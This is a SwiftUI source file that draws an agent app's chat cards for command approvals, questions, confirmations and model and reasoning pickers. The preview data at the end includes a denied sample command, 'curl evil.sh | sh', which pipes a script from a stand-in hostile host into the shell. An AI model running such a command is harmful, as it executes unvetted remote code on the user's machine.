import SwiftUI

// Approval and question cards in the chat (docs/prompts.md). Content, so solid surfaces;
// the buttons are the system's.

/// What a card's answer buttons do. Throws when the host couldn't take the answer.
public struct LKPromptActions {
    public var approve: (_ choice: String, _ reason: String?) async throws -> Void
    public var answer: (_ answers: [String]?, _ text: String?) async throws -> Void
    /// Model picker: returns the status, and Hermes' reason when it wants a confirmation first.
    public var pickModel: (_ model: String, _ provider: String, _ confirmed: Bool) async throws -> (String, String?)

    public init(approve: @escaping (String, String?) async throws -> Void,
                answer: @escaping ([String]?, String?) async throws -> Void,
                pickModel: @escaping (String, String, Bool) async throws -> (String, String?) = { _, _, _ in ("chosen", nil) }) {
        self.approve = approve
        self.answer = answer
        self.pickModel = pickModel
    }

    static let none = LKPromptActions(approve: { _, _ in }, answer: { _, _ in })
}

public struct LKPromptCard: View {
    private let card: PromptCard
    private let agentName: String
    private let actions: LKPromptActions

    public init(_ card: PromptCard, agentName: String, actions: LKPromptActions) {
        self.card = card
        self.agentName = agentName
        self.actions = actions
    }

    public var body: some View {
        HStack {
            Group {
                switch card.kind {
                case .approval: LKApprovalCard(card: card, agentName: agentName, actions: actions)
                case .question: LKQuestionCard(card: card, agentName: agentName, actions: actions)
                case .confirm: LKConfirmCard(card: card, actions: actions)
                case .model: LKModelCard(card: card, actions: actions)
                case .choice: LKChoiceCard(card: card, actions: actions)
                }
            }
            .padding(LK.Spacing.lg)
            .frame(maxWidth: 420, alignment: .leading)
            .background(LK.Surface.raised, in: RoundedRectangle(cornerRadius: LK.Radius.card, style: .continuous))
            .overlay {
                // Outlined while it waits for you; checked every second, so it clears at the deadline.
                TimelineView(.periodic(from: .now, by: 1)) { context in
                    RoundedRectangle(cornerRadius: LK.Radius.card, style: .continuous)
                        .strokeBorder(card.isOpen(now: context.date) && card.needsAttention
                                      ? (card.kind == .question ? LK.Palette.accent : LK.Palette.warning).opacity(0.6)
                                      : .clear, lineWidth: 1.5)
                }
            }
            Spacer(minLength: LK.Spacing.xl)
        }
    }
}

// MARK: - Approval

private struct LKApprovalCard: View {
    let card: PromptCard
    let agentName: String
    let actions: LKPromptActions

    @State private var sending: String?
    @State private var failure: String?
    @State private var askingReason = false
    @State private var reason = ""
    @State private var confirmingAlways = false

    var body: some View {
        TimelineView(.periodic(from: .now, by: 1)) { context in
            let open = card.isOpen(now: context.date)
            VStack(alignment: .leading, spacing: LK.Spacing.md) {
                Label("\(agentName) wants to run a command", systemImage: "exclamationmark.shield.fill")
                    .font(LK.Typography.headline)
                    .foregroundStyle(open ? LK.Palette.warning : .secondary)

                Text(card.command ?? "")
                    .font(LK.Typography.code)
                    .textSelection(.enabled)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(LK.Spacing.md)
                    .background(Color(white: 0.08), in: RoundedRectangle(cornerRadius: LK.Radius.small, style: .continuous))
                    .foregroundStyle(.white)

                if let why = card.description, !why.isEmpty {
                    Text("Why it asks: \(why)")
                        .font(LK.Typography.footnote)
                        .foregroundStyle(.secondary)
                }
                if card.smartDenied == true {
                    Text("Hermes' safety check advised against this.")
                        .font(LK.Typography.footnote.weight(.semibold))
                        .foregroundStyle(LK.Palette.danger)
                }

                if open {
                    buttons
                    if let expiry = card.expiryDate {
                        Text(LKPromptText.timeLeft(until: expiry, now: context.date))
                            .font(LK.Typography.caption)
                            .foregroundStyle(.secondary)
                            .monospacedDigit()
                    }
                } else {
                    LKPromptOutcome(LKPromptText.outcome(of: card, now: context.date))
                }
                if let failure {
                    Text(failure)
                        .font(LK.Typography.caption)
                        .foregroundStyle(LK.Palette.danger)
                }
            }
        }
        .alert("Deny this command?", isPresented: $askingReason) {
            TextField("Reason (optional)", text: $reason)
            Button("Deny", role: .destructive) { send("deny", reason: reason) }
            Button("Cancel", role: .cancel) {}
        } message: {
            Text("\(agentName) is told it was denied, with your reason if you give one.")
        }
        .confirmationDialog("Always allow commands like this?", isPresented: $confirmingAlways, titleVisibility: .visible) {
            Button("Always Allow") { send("always") }
            Button("Cancel", role: .cancel) {}
        } message: {
            Text("\(agentName) won't ask again for commands like this one. This is saved on your Hermes computer and also applies in other apps.")
        }
    }

    private var buttons: some View {
        HStack(spacing: LK.Spacing.sm) {
            Button(role: .destructive) {
                reason = ""
                askingReason = true
            } label: {
                label("Deny", choice: "deny")
            }
            .buttonStyle(.bordered)

            Button {
                send("once")
            } label: {
                label("Allow", choice: "once")
            }
            .buttonStyle(.borderedProminent)
            .tint(LK.Palette.accent)

            if card.choices.contains("session") || card.choices.contains("always") {
                Menu {
                    if card.choices.contains("session") {
                        Button("Allow for This Chat", systemImage: "bubble.left.and.bubble.right") { send("session") }
                    }
                    if card.choices.contains("always") {
                        Button("Always Allow…", systemImage: "checkmark.shield") { confirmingAlways = true }
                    }
                } label: {
                    Image(systemName: "ellipsis")
                        .frame(height: 20)
                        .accessibilityLabel("More choices")
                }
                .buttonStyle(.bordered)
            }
        }
        .disabled(sending != nil)
        .controlSize(.regular)
    }

    private func label(_ title: String, choice: String) -> some View {
        HStack(spacing: LK.Spacing.xs) {
            if sending == choice { ProgressView().controlSize(.small) }
            Text(title).frame(minWidth: 56)
        }
    }

    private func send(_ choice: String, reason: String? = nil) {
        sending = choice
        failure = nil
        let trimmed = reason?.trimmingCharacters(in: .whitespacesAndNewlines)
        Task {
            do {
                try await actions.approve(choice, (trimmed?.isEmpty ?? true) ? nil : trimmed)
            } catch {
                failure = "Couldn't send your answer: \(error.localizedDescription)"
            }
            sending = nil
        }
    }
}

// MARK: - Question

private struct LKQuestionCard: View {
    let card: PromptCard
    let agentName: String
    let actions: LKPromptActions

    @State private var picked: [String] = []
    @State private var typed = ""
    @State private var askingOther = false
    @State private var sending = false
    @State private var failure: String?

    private var multi: Bool { card.multiSelect == true }

    var body: some View {
        VStack(alignment: .leading, spacing: LK.Spacing.md) {
            Label("\(agentName) asks", systemImage: "questionmark.bubble.fill")
                .font(LK.Typography.headline)
                .foregroundStyle(card.isOpen() ? LK.Palette.accent : .secondary)
            Text(LKMessageBubble.markdown(card.question ?? ""))
                .font(LK.Typography.body)

            if card.isOpen() {
                if card.choices.isEmpty {
                    openAnswer
                } else {
                    options
                }
            } else {
                LKPromptOutcome(LKPromptText.outcome(of: card))
            }
            if let failure {
                Text(failure)
                    .font(LK.Typography.caption)
                    .foregroundStyle(LK.Palette.danger)
            }
        }
        .disabled(sending)
        .alert("Your answer", isPresented: $askingOther) {
            TextField("Type your answer", text: $typed)
            Button("Send") { send(text: typed) }
            Button("Cancel", role: .cancel) {}
        }
    }

    private var options: some View {
        VStack(alignment: .leading, spacing: LK.Spacing.sm) {
            ForEach(card.choices, id: \.self) { choice in
                Button {
                    if multi {
                        if let index = picked.firstIndex(of: choice) { picked.remove(at: index) } else { picked.append(choice) }
                    } else {
                        send(answers: [choice])
                    }
                } label: {
                    HStack {
                        if multi {
                            Image(systemName: picked.contains(choice) ? "checkmark.circle.fill" : "circle")
                                .foregroundStyle(picked.contains(choice) ? LK.Palette.accent : .secondary)
                        }
                        Text(choice)
                            .multilineTextAlignment(.leading)
                        Spacer(minLength: 0)
                    }
                    .frame(maxWidth: .infinity, alignment: .leading)
                }
                .buttonStyle(.bordered)
            }
            HStack {
                Button("Other…") {
                    typed = ""
                    askingOther = true
                }
                .buttonStyle(.borderless)
                Spacer()
                if multi {
                    Button("Send") { send(answers: picked) }
                        .buttonStyle(.borderedProminent)
                        .tint(LK.Palette.accent)
                        .disabled(picked.isEmpty)
                }
                if sending { ProgressView().controlSize(.small) }
            }
        }
    }

    private var openAnswer: some View {
        HStack(spacing: LK.Spacing.sm) {
            TextField("Your answer", text: $typed, axis: .vertical)
                .lineLimit(1...4)
                .textFieldStyle(.roundedBorder)
            Button("Send") { send(text: typed) }
                .buttonStyle(.borderedProminent)
                .tint(LK.Palette.accent)
                .disabled(typed.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty)
        }
    }

    private func send(answers: [String]? = nil, text: String? = nil) {
        let trimmed = text?.trimmingCharacters(in: .whitespacesAndNewlines)
        if let trimmed, trimmed.isEmpty { return }
        sending = true
        failure = nil
        Task {
            do {
                try await actions.answer(answers, trimmed)
            } catch {
                failure = "Couldn't send your answer: \(error.localizedDescription)"
            }
            sending = false
        }
    }
}

// MARK: - Confirmation (slash commands such as /new)

private struct LKConfirmCard: View {
    let card: PromptCard
    let actions: LKPromptActions

    @State private var sending: String?
    @State private var failure: String?
    @State private var confirmingAlways = false

    var body: some View {
        TimelineView(.periodic(from: .now, by: 1)) { context in
            let open = card.isOpen(now: context.date)
            VStack(alignment: .leading, spacing: LK.Spacing.md) {
                Label(card.title ?? "Confirm", systemImage: "exclamationmark.triangle.fill")
                    .font(LK.Typography.headline)
                    .foregroundStyle(open ? LK.Palette.warning : .secondary)
                if let what = card.description, !what.isEmpty {
                    Text(LKMessageBubble.markdown(what))
                        .font(LK.Typography.body)
                }
                if open {
                    HStack(spacing: LK.Spacing.sm) {
                        Button { send("cancel") } label: { label("Cancel", choice: "cancel") }
                            .buttonStyle(.bordered)
                        Button { send("once") } label: { label("Approve", choice: "once") }
                            .buttonStyle(.borderedProminent)
                            .tint(LK.Palette.accent)
                        Menu {
                            Button("Always Approve…", systemImage: "checkmark.shield") { confirmingAlways = true }
                        } label: {
                            Image(systemName: "ellipsis")
                                .frame(height: 20)
                                .accessibilityLabel("More choices")
                        }
                        .buttonStyle(.bordered)
                    }
                    .disabled(sending != nil)
                } else {
                    LKPromptOutcome(LKPromptText.outcome(of: card, now: context.date))
                }
                if let failure {
                    Text(failure)
                        .font(LK.Typography.caption)
                        .foregroundStyle(LK.Palette.danger)
                }
            }
        }
        .confirmationDialog("Always approve without asking?", isPresented: $confirmingAlways, titleVisibility: .visible) {
            Button("Always Approve") { send("always") }
            Button("Cancel", role: .cancel) {}
        } message: {
            Text("Hermes won't ask again before commands like this one. This is saved on your Hermes computer and also applies in other apps.")
        }
    }

    private func label(_ title: String, choice: String) -> some View {
        HStack(spacing: LK.Spacing.xs) {
            if sending == choice { ProgressView().controlSize(.small) }
            Text(title).frame(minWidth: 56)
        }
    }

    private func send(_ choice: String) {
        sending = choice
        failure = nil
        Task {
            do {
                try await actions.approve(choice, nil)
            } catch {
                failure = "Couldn't send your answer: \(error.localizedDescription)"
            }
            sending = nil
        }
    }
}

// MARK: - Model picker (/model)

private struct LKModelCard: View {
    let card: PromptCard
    let actions: LKPromptActions
    @State private var choosing = false

    private var current: String {
        let provider = card.providers?.first { $0.slug == card.currentProvider }?.name ?? card.currentProvider ?? ""
        guard let model = card.currentModel, !model.isEmpty else { return "No model set" }
        return provider.isEmpty ? model : "\(model) · \(provider)"
    }

    var body: some View {
        VStack(alignment: .leading, spacing: LK.Spacing.md) {
            Label("Model", systemImage: "cpu")
                .font(LK.Typography.headline)
                .foregroundStyle(card.isOpen() ? LK.Palette.accent : .secondary)
            if card.isOpen() {
                Text("Now: \(current)")
                    .font(LK.Typography.body)
                Button("Choose a Model…") { choosing = true }
                    .buttonStyle(.borderedProminent)
                    .tint(LK.Palette.accent)
            } else {
                LKPromptOutcome(LKPromptText.outcome(of: card))
            }
        }
        .sheet(isPresented: $choosing) {
            LKModelPickerSheet(card: card, actions: actions)
        }
    }
}

/// Every model Hermes can switch this agent to, by provider, with search.
struct LKModelPickerSheet: View {
    let card: PromptCard
    let actions: LKPromptActions
    @Environment(\.dismiss) private var dismiss
    @State private var search = ""
    @State private var switching: String?
    @State private var warning: (model: String, provider: String, message: String)?
    @State private var failure: String?

    private var sections: [PromptCard.ModelProvider] {
        let query = search.trimmingCharacters(in: .whitespaces).lowercased()
        let all = (card.providers ?? []).sorted { $0.isCurrent && !$1.isCurrent }
        guard !query.isEmpty else { return all }
        return all.compactMap { provider in
            // A provider's whole list when its name starts with the search ("open" -> OpenRouter);
            // otherwise only the models that match ("llama" doesn't pull in all of "Ollama").
            let models = provider.name.lowercased().hasPrefix(query)
                ? provider.models : provider.models.filter { $0.lowercased().contains(query) }
            return models.isEmpty ? nil : PromptCard.ModelProvider(
                slug: provider.slug, name: provider.name, models: models, isCurrent: provider.isCurrent,
                totalModels: provider.totalModels, modelLabels: provider.modelLabels)
        }
    }

    var body: some View {
        NavigationStack {
            List {
                if let failure {
                    Text(failure).foregroundStyle(LK.Palette.danger).font(LK.Typography.footnote)
                }
                ForEach(sections, id: \.slug) { provider in
                    Section {
                        ForEach(provider.models, id: \.self) { model in
                            row(model: model, provider: provider)
                        }
                    } header: {
                        Text(provider.name)
                    } footer: {
                        if provider.totalModels > provider.models.count && search.isEmpty {
                            Text("Showing \(provider.models.count) of \(provider.totalModels) models from \(provider.name).")
                        }
                    }
                }
            }
            .overlay {
                if sections.isEmpty {
                    ContentUnavailableView.search(text: search)
                }
            }
            .searchable(text: $search, prompt: "Search models")
            .navigationTitle("Choose a Model")
            #if os(iOS)
            .navigationBarTitleDisplayMode(.inline)
            #endif
            .toolbar {
                ToolbarItem(placement: .cancellationAction) {
                    Button("Cancel") { dismiss() }
                }
            }
            .alert("Switch anyway?", isPresented: Binding(get: { warning != nil }, set: { if !$0 { warning = nil } })) {
                Button("Switch Anyway") {
                    if let warning { pick(warning.model, warning.provider, confirmed: true) }
                }
                Button("Cancel", role: .cancel) {}
            } message: {
                Text(warning?.message ?? "")
            }
        }
    }

    private func row(model: String, provider: PromptCard.ModelProvider) -> some View {
        let isCurrent = provider.slug == card.currentProvider && model == card.currentModel
        return Button {
            pick(model, provider.slug, confirmed: false)
        } label: {
            HStack {
                Text(model)
                    .foregroundStyle(.primary)
                if let label = provider.modelLabels?[model] {
                    Text(label)
                        .font(LK.Typography.caption.weight(.semibold))
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(LK.Palette.accent.opacity(0.15), in: Capsule())
                        .foregroundStyle(LK.Palette.accent)
                }
                Spacer()
                if switching == model {
                    ProgressView()
                } else if isCurrent {
                    Image(systemName: "checkmark").foregroundStyle(LK.Palette.accent)
                }
            }
        }
        .disabled(switching != nil)
    }

    private func pick(_ model: String, _ provider: String, confirmed: Bool) {
        switching = model
        failure = nil
        Task {
            do {
                let (status, message) = try await actions.pickModel(model, provider, confirmed)
                switching = nil
                if status == "needs_confirmation" {
                    warning = (model, provider, message ?? "Hermes flagged this model.")
                } else {
                    dismiss()
                }
            } catch {
                switching = nil
                failure = "Couldn't switch: \(error.localizedDescription)"
            }
        }
    }
}

// MARK: - Choice picker (/reasoning, /fast…)

private struct LKChoiceCard: View {
    let card: PromptCard
    let actions: LKPromptActions
    @State private var sending: String?
    @State private var failure: String?

    var body: some View {
        VStack(alignment: .leading, spacing: LK.Spacing.md) {
            Text(LKMessageBubble.markdown(card.title ?? ""))
                .font(LK.Typography.body)
            if card.isOpen() {
                VStack(alignment: .leading, spacing: LK.Spacing.sm) {
                    ForEach(card.options ?? [], id: \.value) { option in
                        Button {
                            choose(option.value)
                        } label: {
                            HStack {
                                Text(option.label).multilineTextAlignment(.leading)
                                Spacer(minLength: 0)
                                if sending == option.value {
                                    ProgressView().controlSize(.small)
                                } else if option.isCurrent {
                                    Image(systemName: "checkmark")
                                }
                            }
                            .frame(maxWidth: .infinity, alignment: .leading)
                        }
                        .buttonStyle(.bordered)
                        .tint(option.isCurrent ? LK.Palette.accent : nil)
                    }
                }
                .disabled(sending != nil)
            } else {
                LKPromptOutcome(LKPromptText.outcome(of: card))
            }
            if let failure {
                Text(failure).font(LK.Typography.caption).foregroundStyle(LK.Palette.danger)
            }
        }
    }

    private func choose(_ value: String) {
        sending = value
        failure = nil
        Task {
            do {
                try await actions.approve(value, nil)
            } catch {
                failure = "Couldn't send your choice: \(error.localizedDescription)"
            }
            sending = nil
        }
    }
}

// MARK: - Shared

/// The line a card shows once it can't be answered any more.
private struct LKPromptOutcome: View {
    let outcome: (text: String, symbol: String, positive: Bool?)

    init(_ outcome: (text: String, symbol: String, positive: Bool?)) {
        self.outcome = outcome
    }

    var body: some View {
        Label(outcome.text, systemImage: outcome.symbol)
            .font(LK.Typography.subheadline.weight(.semibold))
            .foregroundStyle(outcome.positive == true ? LK.Palette.success
                             : outcome.positive == false ? LK.Palette.danger : Color.secondary)
    }
}

public enum LKPromptText {
    /// "4:32 left"
    public static func timeLeft(until expiry: Date, now: Date = Date()) -> String {
        let seconds = max(0, Int(expiry.timeIntervalSince(now).rounded(.up)))
        return String(format: "%d:%02d left", seconds / 60, seconds % 60)
    }

    /// What a finished card says, its symbol, and whether it went ahead (nil = neither).
    public static func outcome(of card: PromptCard, now: Date = Date()) -> (text: String, symbol: String, positive: Bool?) {
        switch card.status {
        case "allowed_once": return ("Allowed once", "checkmark.circle.fill", true)
        case "allowed_session": return ("Allowed for this chat", "checkmark.circle.fill", true)
        case "allowed_always": return ("Always allowed", "checkmark.shield.fill", true)
        case "denied":
            let reason = card.reason.map { " — \($0)" } ?? ""
            return ("Denied\(reason)", "xmark.circle.fill", false)
        case "timed_out": return ("Timed out — nothing ran", "clock.badge.xmark", nil)
        case "answered": return ("You answered: \(card.answer ?? "")", "checkmark.circle.fill", true)
        case "confirmed_once": return ("Approved", "checkmark.circle.fill", true)
        case "confirmed_always": return ("Approved — won't ask again", "checkmark.shield.fill", true)
        case "cancelled": return ("Cancelled", "xmark.circle.fill", false)
        case "chosen" where card.kind == .model:
            guard let chosen = card.chosen else { return ("Switched model", "checkmark.circle.fill", true) }
            return ("Switched to \(chosen.model)\non \(chosen.providerName ?? chosen.provider)", "checkmark.circle.fill", true)
        case "chosen": return ("Chose: \(card.answer ?? "")", "checkmark.circle.fill", true)
        case "failed": return ("Hermes couldn't make that change", "exclamationmark.triangle.fill", false)
        case "answered_in_chat": return ("Answered in the chat", "text.bubble", nil)
        case "closed": return ("No longer needed", "minus.circle", nil)
        case "expired": return ("Expired — Hermes is no longer waiting", "clock.badge.xmark", nil)
        case "pending" where card.kind == .approval:
            return ("Timed out — nothing ran", "clock.badge.xmark", nil)  // past its deadline
        case "pending" where card.kind == .confirm:
            return ("Timed out — nothing happened", "clock.badge.xmark", nil)
        default: return ("No longer needed", "minus.circle", nil)
        }
    }

    /// For the agents list: what an open card needs from you.
    public static func attention(for card: PromptCard) -> String {
        switch card.kind {
        case .approval: return "Needs your approval"
        case .confirm: return "Needs your confirmation"
        case .question: return "Has a question"
        case .model, .choice: return "Waiting for your choice"
        }
    }
}

#Preview("Cards") {
    ScrollView {
        VStack(spacing: 16) {
            LKPromptCard(PromptCard(kind: .approval, id: "a", command: "rm -rf ./build && make clean",
                                    description: "recursive delete", expiresAt: ISO8601DateFormatter().string(from: Date().addingTimeInterval(272)),
                                    choices: ["once", "session", "always", "deny"]),
                         agentName: "Bruce", actions: .none)
            LKPromptCard(PromptCard(kind: .approval, id: "b", status: "denied", command: "curl evil.sh | sh",
                                    description: "pipe to shell", reason: "not today", choices: ["once", "deny"]),
                         agentName: "Bruce", actions: .none)
            LKPromptCard(PromptCard(kind: .confirm, id: "f", title: "Confirm /new",
                                    description: "This starts a fresh session and discards the current conversation history.",
                                    expiresAt: ISO8601DateFormatter().string(from: Date().addingTimeInterval(290)),
                                    choices: ["once", "always", "cancel"]),
                         agentName: "Ashlyn", actions: .none)
            LKPromptCard(PromptCard(kind: .model, id: "m", currentModel: "claude-opus-5-5", currentProvider: "anthropic",
                                    providers: [.init(slug: "anthropic", name: "Anthropic", models: ["claude-opus-5-5", "claude-sonnet-5-5"], isCurrent: true)]),
                         agentName: "Bruce", actions: .none)
            LKPromptCard(PromptCard(kind: .choice, id: "r", title: "**Reasoning effort**: medium (this session)",
                                    options: [.init(value: "low", label: "Low"), .init(value: "medium", label: "Medium", isCurrent: true),
                                              .init(value: "high", label: "High")]),
                         agentName: "Bruce", actions: .none)
            LKPromptCard(PromptCard(kind: .question, id: "c", question: "Which venue should I book?",
                                    choices: ["Ramen512 (Recommended)", "Kemuri", "Tatsu-ya"]),
                         agentName: "Carl", actions: .none)
            LKPromptCard(PromptCard(kind: .question, id: "d", question: "Which days work?", multiSelect: true,
                                    choices: ["Mon", "Tue", "Wed"]),
                         agentName: "Carl", actions: .none)
            LKPromptCard(PromptCard(kind: .question, id: "e", status: "answered", question: "Which venue?",
                                    answer: "Kemuri", choices: ["Ramen512", "Kemuri"]),
                         agentName: "Carl", actions: .none)
        }
        .padding()
    }
    .preferredColorScheme(.dark)
}
